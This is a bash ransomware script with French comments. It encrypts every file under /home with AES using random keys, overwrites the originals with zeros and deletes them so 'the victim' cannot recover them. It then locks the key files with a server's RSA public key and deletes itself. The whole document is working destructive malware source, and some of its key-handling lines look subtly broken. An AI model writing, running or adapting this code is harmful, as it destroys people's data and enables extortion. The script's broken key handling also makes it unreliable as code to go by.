
#!/bin/bash

# Ici on ouvre une boucle qui exécutera le code de chiffrement sur chaque FICHIER
# à l'interieur du répertoire sélectionné et de ses sous répertoires ( /home dans notre cas )

nbFile=1
mkdir /encFiles >> /dev/null 2>&1

for f in $(find /home/* -type f)
do
        # Ces lignes permettent de créer un fichier de récupération,
        # il aidera le script de déchiffrement à trouver les fichiers à déchiffrer

        realpath $f'.enc' >> /encFiles/encFile$nbFile.gc
        RANDOM=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
        openssl enc -nosalt -aes-256-cbc -k $RANDOM -P | cut -f6- -d : | sed 's/key=//' | sed 's/iv =//' >> /encFiles/encFile$nbFile.gc

        # On crée un nouveau fichier chiffré grâce à AES

        KEY=$(grep -A1 $(realpath $f) /encFiles/encFile$nbFile.gc | grep -v $(realpath $f))
        IV=$(grep -A1 $KEY /encFiles/encFile$nbFile.gc | grep -v $KEY)
        openssl enc -nosalt -aes-256-cbc -in $f -out $f'.enc' -K $KEY -iv $IV

        # Grâce à cette ligne, on remplacera tout les caractères
        # des fichiers avant de les supprimer, de façon à empêcher
        # la victime de recourir à un logiciel pour récuperer ses données

        sed -i 's/./0/Ig' $f > /dev/null 2>&1

        # On supprime les fichiers à la fin de l'oppération

        rm $f > /dev/null 2>&1

        ((nbFile++))
done

# Une fois les fichiers chiffrés, les fichiers de /encFiles devront être chiffrés à leur tour
# de façon à empêcher la victime de récuperer les clés symétriques, on les chiffrera
# donc avec la clé public du serveur, générée à la création du malware

for f in $(find /encFiles/* -type f)
do
        openssl rsautl -encrypt -inkey publicServer-key.pem -pubin -in $f -out $f.enc
        rm $f > /dev/null 2>&1
done

# Enfin, on supprimera ce script

rm -- "$0"
